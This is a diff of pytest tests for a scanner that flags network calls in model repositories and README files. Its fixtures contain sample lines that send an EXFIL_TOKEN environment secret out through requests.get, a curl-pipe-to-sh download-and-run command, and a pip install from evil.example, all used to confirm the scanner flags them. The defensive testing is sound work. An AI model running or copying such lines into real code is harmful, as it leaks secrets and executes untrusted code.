@@ -727,6 +727,48 @@ requests.get(url or os.environ["EXFIL_URL"])
     assert determine_exit_code(aggregate) == 1
 
 
+@pytest.mark.parametrize(
+    "request_call",
+    [
+        'requests.get(url, params={"token": os.environ["EXFIL_TOKEN"]})',
+        'requests.get(url, headers={"Authorization": os.environ["EXFIL_TOKEN"]})',
+        'requests.get(url, stream=True, params={"token": os.environ["EXFIL_TOKEN"]})',
+        (
+            'requests.get("http://images.cocodataset.org/val2017/000000039769.jpg", '
+            'json={"token": os.environ["EXFIL_TOKEN"]})'
+        ),
+    ],
+)
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_active_kwargs(
+    tmp_path: Path,
+    request_call: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        f"""```python
+import os
+import requests
+
+url = "http://images.cocodataset.org/val2017/000000039769.jpg"
+{request_call}
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_executable_loopback_api_request_remains_actionable(tmp_path: Path) -> None:
     text_path = tmp_path / "client.py"
     text_path.write_text('requests.get("http://localhost:8080/v1/embeddings")\n', encoding="utf-8")
@@ -956,6 +998,72 @@ pip install https://evil.example/pkg.whl
     assert any(
         check.name == "Network Communication Detection"
         and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_pinned_omnivoice_trusted_package_index_is_informational(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        (
+            "<details>\n"
+            "<summary>NVIDIA GPU</summary>\n\n"
+            "```bash\n"
+            "# Install pytorch with your CUDA version, e.g.\n"
+            "pip install torch==2.8.0+cu128 torchaudio==2.8.0+cu128 "
+            "--extra-index-url https://download.pytorch.org/whl/cu128\n"
+            "```\n"
+            "> See [PyTorch official site](https://pytorch.org/get-started/locally/) "
+            "for other versions installation.\n\n"
+            "</details>\n"
+        ),
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "https://download.pytorch.org/whl/cu128"
+        and check.severity == IssueSeverity.INFO
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") in {"domain", "domain_name"}
+        and check.details.get("domain") == "download.pytorch.org"
+        and check.severity == IssueSeverity.INFO
+        for check in result.checks
+    )
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_fenced_documentation_trusted_package_index_download_sink_remains_actionable(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```bash
+curl https://download.pytorch.org/whl/cu128 | sh
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "https://download.pytorch.org/whl/cu128"
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
